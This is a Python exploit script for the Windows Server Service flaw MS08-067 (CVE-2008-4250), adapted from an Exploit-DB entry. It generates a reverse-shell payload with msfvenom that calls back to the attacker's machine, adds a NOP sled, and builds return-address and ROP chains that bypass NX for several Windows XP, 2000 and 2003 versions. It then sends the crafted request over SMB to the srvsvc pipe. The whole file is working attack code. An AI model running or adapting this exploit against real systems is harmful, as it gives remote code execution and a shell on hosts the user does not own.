# Exploit Title: Microsoft Windows Server Service Crafted RPC Request Handling Remote Code Execution - MS08-067
# Source: https://www.exploit-db.com/exploits/40279
# CVE: CVE-2008-4250
# example: python ms08-067.py 10.10.10.4 7 tun0 4444

#!/usr/bin/python3

import struct
import time
import sys
from threading import Thread
import netifaces as ni
import shlex
import subprocess
import argparse
try:
    from impacket import smb
    from impacket import uuid
    # from impacket.dcerpc import dcerpc
    from impacket.dcerpc.v5 import transport

except ImportError:
    print('Packages : pip install impacket netifaces pycrypto')
    sys.exit(1)

parser = argparse.ArgumentParser()
parser.add_argument("ip", help="input the ip of the host", type=str)
parser.add_argument("target", help="input your network adapter (ex: tun0)",
                    type=int, choices=[1, 2, 3, 4, 5, 6, 7])
parser.add_argument(
    "adapter", help="input your network adapter (ex: tun0)", type=str)
parser.add_argument(
    "local_port", help="input your reverse port (ex: 4444) --> nc -nvlp 4444", type=int)
parser.add_argument(
    "-pipe", help="input the pipe (https://github.com/k4u5h41/MS17-010_CVE-2017-0143/blob/main/checker.py)", type=str, default='browser')
parser.add_argument(
    "-port", help="input the port (MS08-067)", type=int, default=445)

args = parser.parse_args()
ip = args.ip
target = str(args.target)
adapter = args.adapter
port = args.port
pipe = args.pipe
local_port = args.local_port


print('\t## EclipsedWing (MS08-067) Exploit ##')

# get ip from adapter
try:
    local_ip = ni.ifaddresses(adapter)[ni.AF_INET][0]['addr']
except ValueError:
    print("Check Adapter: {0}".format(adapter))
    sys.exit(1)

# create reverse shell payload
shellcode = b""
msfvenom_cmd = r'msfvenom -p windows/shell_reverse_tcp LHOST={0} LPORT={1} EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -v shellcode -f py -a x86 --platform windows'.format(
    local_ip, local_port)
msfvenom_shell = subprocess.run(shlex.split(
    msfvenom_cmd), shell=False, universal_newlines=True, capture_output=True).stdout
# msfvenom_shell = msfvenom_shell.replace('shellcode =  b""', '')
# msfvenom_shell = msfvenom_shell.replace('b"\\', '"\\')
exec(msfvenom_shell)

# display cmd and payload
print("cmd: ", msfvenom_cmd)
print(msfvenom_shell)

# Gotta make No-Ops (NOPS) + shellcode = 410 bytes
num_nops = 410 - len(shellcode)
newshellcode = b"\x90" * num_nops
newshellcode += shellcode  # Add NOPS to the front
shellcode = newshellcode   # Switcheroo with the newshellcode temp variable

print("Shellcode length: %s\n\n" % len(shellcode))

nonxjmper = "\x08\x04\x02\x00%s" + "\x41" * 4 + "%s" + \
    "\x41" * 42 + "\x90" * 8 + "\xeb\x62" + "\x41" * 10
disableNXjumper = "\x08\x04\x02\x00%s%s%s" + "\x41" * \
    28 + "%s" + "\xeb\x02" + "\x90" * 2 + "\xeb\x62"
ropjumper = "\x00\x08\x01\x00" + "%s" + "\x10\x01\x04\x01"
module_base = 0x6f880000


def generate_rop(rvas):
    ret = struct.pack('<L', 0x00018000)
    ret += struct.pack('<L', rvas['call_HeapCreate'] + module_base)
    ret += struct.pack('<L', 0x01040110)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L',
                       rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += b"\x90\x5a\x59\xc3"
    ret += struct.pack('<L', rvas['mov [eax], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += b"\x90\x89\xc7\x83"
    ret += b"\xc7\x0c\x6a\x7f"
    ret += struct.pack('<L', rvas[
                       'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += b"\x59\xf2\xa5\x90"
    ret += struct.pack('<L', rvas['mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['add eax, 8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += b"\xcc\x90\xeb\x5a"
    return ret


class SRVSVC_Exploit(Thread):
    def __init__(self, target, os, port=445, pipe='browser'):
        super(SRVSVC_Exploit, self).__init__()

        # MODIFIED HERE
        # Changed __port to port ... not sure if that does anything. I'm a newb.
        self.port = port
        self.target = target
        self.os = os
        self.pipe = pipe

    def __DCEPacket(self):
        if (self.os == '1'):
            print('Windows XP SP0/SP1 Universal\n')
            ret = b"\x61\x13\x00\x01"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '2'):
            print('Windows 2000 Universal\n')
            ret = b"\xb0\x1c\x1f\x00"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '3'):
            print('Windows 2003 SP0 Universal\n')
            ret = b"\x9e\x12\x00\x01"  # 0x01 00 12 9e
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '4'):
            print('Windows 2003 SP1 English\n')
            ret_dec = b"\x8c\x56\x90\x7c"  # 0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
            ret_pop = b"\xf4\x7c\xa2\x7c"  # 0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
            jmp_esp = b"\xd3\xfe\x86\x7c"  # 0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
            disable_nx = b"\x13\xe4\x83\x7c"  # 0x 7c 83 e4 13 NX disable @NTDLL.DLL
            jumper = disableNXjumper % (
                ret_dec * 6, ret_pop, disable_nx, jmp_esp * 2)
        elif (self.os == '5'):
            print('Windows XP SP3 French (NX)\n')
            ret = b"\x07\xf8\x5b\x59"  # 0x59 5b f8 07
            disable_nx = b"\xc2\x17\x5c\x59"  # 0x59 5c 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '6'):
            print('Windows XP SP3 English (NX)\n')
            ret = b"\x07\xf8\x88\x6f"  # 0x6f 88 f8 07
            disable_nx = b"\xc2\x17\x89\x6f"  # 0x6f 89 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '7'):
            print('Windows XP SP3 English (AlwaysOn NX)\n')
            rvasets = {'call_HeapCreate': 0x21286, 'add eax, ebp / mov ecx, 0x59ffffa8 / ret': 0x2e796, 'pop ecx / ret': 0x2e796 + 6,
                       'mov [eax], ecx / ret': 0xd296, 'jmp eax': 0x19c6f, 'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret': 0x10a56, 'mov [eax+0x10], ecx / ret': 0x10a56 + 6, 'add eax, 8 / ret': 0x29c64}
            # the nonxjmper also work in this case.
            jumper = generate_rop(rvasets) + b"\x41\x42"
        else:
            print('Not supported OS version\n')
            sys.exit(-1)

        print('[-]Initiating connection')

        # MORE MODIFICATIONS HERE #############################################################################################

        if (self.port == '445'):
            self.__trans = transport.DCERPCTransportFactory(
                'ncacn_np:{0}[\\pipe\\{1}]'.format(self.target, pipe))
        else:
            # DCERPCTransportFactory doesn't call SMBTransport with necessary parameters. Calling directly here.
            # *SMBSERVER is used to force the library to query the server for its NetBIOS name and use that to
            #   establish a NetBIOS Session.  The NetBIOS session shows as NBSS in Wireshark.

            self.__trans = transport.SMBTransport(
                remoteName='*SMBSERVER', remote_host='%s' % self.target, dstport=int(self.port), filename='\\{0}'.format(pipe)
            )

        self.__trans.connect()
        print(
            ('[-]connected to ncacn_np:{0}[\\pipe\\{1}]'.format(self.target, pipe))
        )
        self.__dce = self.__trans.DCERPC_class(self.__trans)
        self.__dce.bind(
            uuid.uuidtup_to_bin(
                ('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0'))
        )
        # "ABCDEFGHIJ" * 10 --> "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A" * 10
        path = b"\x5c\x00" + b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A" * 10
        path += shellcode
        path += b"\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00"
        path += b"\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00"
        path += jumper
        path += b"\x00" * 2
        server = b"\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix = b"\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"

        # NEW HOTNESS
        # The Path Length and the "Actual Count" SMB parameter have to match.  Path length in bytes
        #   is double the ActualCount field.  MaxCount also seems to match.  These fields in the SMB protocol
        #   store hex values in reverse byte order.  So: 36 01 00 00  => 00 00 01 36 => 310.  No idea why it's "doubled"
        #   from 310 to 620.  620 = 410 shellcode + extra stuff in the path.
        MaxCount = b"\x36\x01\x00\x00"  # Decimal 310. => Path length of 620.
        Offset = b"\x00\x00\x00\x00"
        ActualCount = b"\x36\x01\x00\x00"  # Decimal 310. => Path length of 620

        self.__stub = server + MaxCount + Offset + ActualCount + path + \
            b"\xE8\x03\x00\x00" + prefix + b"\x01\x10\x00\x00\x00\x00\x00\x00"

        return

    def run(self):
        self.__DCEPacket()
        self.__dce.call(0x1f, self.__stub)
        time.sleep(5)
        print('Exploit finish\n')
        return


# send rce
current = SRVSVC_Exploit(ip, target, port, pipe)
current.start()
